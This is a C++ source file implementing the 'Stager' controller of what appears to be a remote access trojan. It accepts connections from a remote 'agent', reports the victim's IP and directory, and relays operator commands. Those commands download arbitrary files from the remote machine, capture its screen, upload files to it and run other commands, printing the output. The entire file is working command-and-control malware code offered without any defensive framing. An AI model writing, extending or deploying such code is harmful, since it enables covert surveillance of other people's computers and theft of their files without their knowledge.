#include "Stager.h"

void Stager::OnConnect(Connection newConnection)
{
    std::cout << "[+] Accepted new connection: [ ip: " << newConnection.GetIp() << ", port: " << newConnection.GetPort() << "]" << std::endl;

    Packet packet;
    newConnection.Recv(packet);

    uint32_t packetSize = packet.PacketSize();
    std::cout << "[+] Current Directory: ";

    while (packet.GetPacketOffset() < packetSize)
        std::cout << packet.ExtractString();

    std::cout << std::endl;
}


bool Stager::Logic(const std::string& cmd)
{
    if (cmd == "Quit")
        return false;

    if (cmd == "")
        return true;

    PacketType packetType = MapPacketType(cmd);
    Packet     packet(packetType);
        
    // receive a file because a packet type of FileRequest/Screenshot will be sent 
    if (packetType == PacketType::FileRequest or packetType == PacketType::Screenshot)
    {
        std::string filename;

        // if we want a screenshot generate a file name.
        if (packetType == PacketType::Screenshot)
        {
            std::string temporary = "sc_XXXXXX";
            if (::_mktemp_s(const_cast<char*>(temporary.c_str()), temporary.size() + 1) != 0)
            {
                std::cerr << "Error at _mktemp_s." << std::endl;
                return false;
            }

            filename = temporary + ".jpg";
        }

        // if we want to download a file, extract the name from the command string
        else filename = cmd.substr(cmd.find(' ') + 1);

        packet.InsertString(filename);

        // send packet with the file name which we want to receive
        if (not clientConn.Send(packet))
        {
            std::cerr << "Error at Send (download pcket)." << std::endl;
            return false;
        }

        // receive packet with filename and file size
        if (not clientConn.Recv(packet))
        {
            std::cerr << "Error at Send (download pcket)." << std::endl;
            return false;
        }

        // check for error
        if (packet.GetPacketType() == PacketType::Invalid)
        {
            std::cout << "No such file or directory." << std::endl;
            return true;
        }
                
        filename = packet.ExtractString();
        uint32_t filesize = packet.ExtractInt();

        if (not clientConn.RecvFile(filename, filesize))
        {
            std::cerr << "Error at RecvFile." << std::endl;
            return false;
        }

        // exit the function since we received the file
        return true;
    }

    // send file
    else if (packetType == PacketType::FileTransmit)
    {
        // check if file exist, if not display error message
        // send the file
        std::string filename = cmd.substr(cmd.find(' ') + 1);

        if (std::filesystem::exists(filename))
        {
            if (not clientConn.SendFile(filename))
            {
                std::cerr << "Error at SendFile." << std::endl;
            }
        }

        else
        {
            std::cout << "No such file or directory." << std::endl;
        }

        // exit the function since we sent the file or got an error
        return true;
    }
    
    // send connectionClose packet to the agent and return
    if (packetType == PacketType::ConnectionClose)
    {
        if (not clientConn.Send(packet))
        {
            std::cerr << "Error at Send (ConnectionClose)." << std::endl;
        }

        return true;
    }
        packet.InsertString(cmd);

    // send packet since it is not send/recv file
    if (not clientConn.Send(packet))
    {
        std::cerr << "Error at Send (ConnectionClose)." << std::endl;
    }

    // now receive the response
    if (not clientConn.Recv(packet))
    {
        std::cerr << "Error at Recv (agent response)." << std::endl;
    }

    // print the output
    std::cout << '\n' << packet.ExtractString();

	return true;
}

// map command to packet types
PacketType Stager::MapPacketType(const std::string& cmd)
{
    std::string commandType = cmd.substr(0, cmd.find(' '));
    std::string commandArgs = cmd.substr(cmd.find(' ') + 1);
    
    if (cmd == "agentdown")
        return PacketType::ConnectionClose;

    else if (cmd == "screenshot")
        return PacketType::Screenshot;

    else if (commandType == "upload")
        return PacketType::FileTransmit;

    else if (commandType == "download")
        return PacketType::FileRequest;

    else if (commandType == "cd" and commandArgs != commandType) // ugly but works
        return PacketType::Pwd;

    else 
        return PacketType::Characters;
}
